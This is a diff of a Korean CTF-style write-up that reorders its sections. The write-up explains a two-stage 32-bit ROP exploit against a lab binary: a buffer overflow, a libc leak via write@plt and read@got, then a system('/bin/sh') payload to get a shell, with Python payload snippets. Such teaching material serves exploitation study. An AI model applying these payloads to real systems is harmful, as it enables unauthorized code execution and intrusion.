@@ -32,49 +32,7 @@ int main() {
 - `read(0, buf, 0x400)` — `buf`는 `0x40`인데 `0x400`을 받으므로 **반환 주소까지 덮을 수 있다.**
 - `write(1, buf, 0x40)` — 입력한 buf를 **화면에 그대로 출력**한다. `write`로 원하는 주소(함수 GOT)를 출력시키면 **libc 주소 leak**이 가능하다.
 
-### 3. 페이로드 구성
-
-바이너리에 `system`이 없으므로 **2단계(ROP)**로 간다.
-
-**Stage 1 — libc 주소 leak**
-
-```python
-payload  = b"A" * offset
-payload += p32(write_plt)       # RET 덮기 = write 실행
-payload += p32(cleanup_gadget)  # write의 복귀주소
-payload += p32(1)               # write 인자1: fd=1 (화면)
-payload += p32(read_got)        # write 인자2: read@got (출력할 주소)
-payload += p32(4)               # write 인자3: 4바이트
-payload += p32(main)            # 정리 후 main으로 재시작
-```
-
-- `write_plt` — `write(1, read_got, 4)` 실행 → **read의 실제 주소(libc 주소)를 화면에 출력**.
-- `cleanup_gadget` (`pop esi; pop edi; pop ebp; ret`) — 32비트는 호출 후 **인자 3개(12바이트)가 스택에 남는다.** `pop` 3번으로 그 인자를 걷어내고 `ret`으로 `main`에 복귀.
-- `main` — leak만 하고 끝나면 다시 입력받을 수 없으니, **main으로 돌아가 Stage 2를 받는다.**
-
-leak한 `read` 주소로 libc 베이스를 구하고, 나머지 주소를 계산한다.
-
-```python
-libc_base = read_addr - read_offset   # libc 시작 주소 (ASLR로 매번 바뀜)
-system = libc_base + system_offset
-exit   = libc_base + exit_offset
-binsh  = libc_base + binsh_offset
-```
-
-**Stage 2 — `system("/bin/sh")`**
-
-```python
-payload  = b"A" * offset
-payload += p32(system)   # RET 덮기 = system 실행
-payload += p32(exit)     # system의 복귀주소
-payload += p32(binsh)    # system의 인자: "/bin/sh"
-```
-
-- **`system`** — 인자로 준 명령을 실행하는 함수. `system("/bin/sh")` → **셸 획득**.
-- **`binsh`** — libc 안의 `"/bin/sh"` 문자열. system의 인자(`[esp+4]`).
-- **`exit`** — system이 끝난 뒤 돌아갈 복귀주소(`[esp]`). 셸을 닫으면 **깔끔히 종료**(없으면 SegFault).
-
-### 4. 익스플로잇 코드
+### 3. 익스플로잇 코드
 
 ```python
 #!/usr/bin/env python3
@@ -130,6 +88,48 @@ p.interactive()
 </p>
 
 > `ELF("./basic_rop_x86")`, `ELF("./libc.so.6")`는 로컬 파일을 읽어 주소를 뽑으니 **두 파일이 실행 폴더에 있어야** 하고, `libc.so.6`은 **서버와 같은 버전**이어야 한다.
+
+### 4. 페이로드 구성 — 2단계 ROP
+
+바이너리에 `system`이 없으므로 **2단계(ROP)**로 간다.
+
+**Stage 1 — libc 주소 leak**
+
+```python
+payload  = b"A" * offset
+payload += p32(write_plt)       # RET 덮기 = write 실행
+payload += p32(cleanup_gadget)  # write의 복귀주소
+payload += p32(1)               # write 인자1: fd=1 (화면)
+payload += p32(read_got)        # write 인자2: read@got (출력할 주소)
+payload += p32(4)               # write 인자3: 4바이트
+payload += p32(main)            # 정리 후 main으로 재시작
+```
+
+- `write_plt` — `write(1, read_got, 4)` 실행 → **read의 실제 주소(libc 주소)를 화면에 출력**.
+- `cleanup_gadget` (`pop esi; pop edi; pop ebp; ret`) — 32비트는 호출 후 **인자 3개(12바이트)가 스택에 남는다.** `pop` 3번으로 그 인자를 걷어내고 `ret`으로 `main`에 복귀.
+- `main` — leak만 하고 끝나면 다시 입력받을 수 없으니, **main으로 돌아가 Stage 2를 받는다.**
+
+leak한 `read` 주소로 libc 베이스를 구하고, 나머지 주소를 계산한다.
+
+```python
+libc_base = read_addr - read_offset   # libc 시작 주소 (ASLR로 매번 바뀜)
+system = libc_base + system_offset
+exit   = libc_base + exit_offset
+binsh  = libc_base + binsh_offset
+```
+
+**Stage 2 — `system("/bin/sh")`**
+
+```python
+payload  = b"A" * offset
+payload += p32(system)   # RET 덮기 = system 실행
+payload += p32(exit)     # system의 복귀주소
+payload += p32(binsh)    # system의 인자: "/bin/sh"
+```
+
+- **`system`** — 인자로 준 명령을 실행하는 함수. `system("/bin/sh")` → **셸 획득**.
+- **`binsh`** — libc 안의 `"/bin/sh"` 문자열. system의 인자(`[esp+4]`).
+- **`exit`** — system이 끝난 뒤 돌아갈 복귀주소(`[esp]`). 셸을 닫으면 **깔끔히 종료**(없으면 SegFault).
 
 ### 5. offset = 0x48 — 왜 0x48인가
 
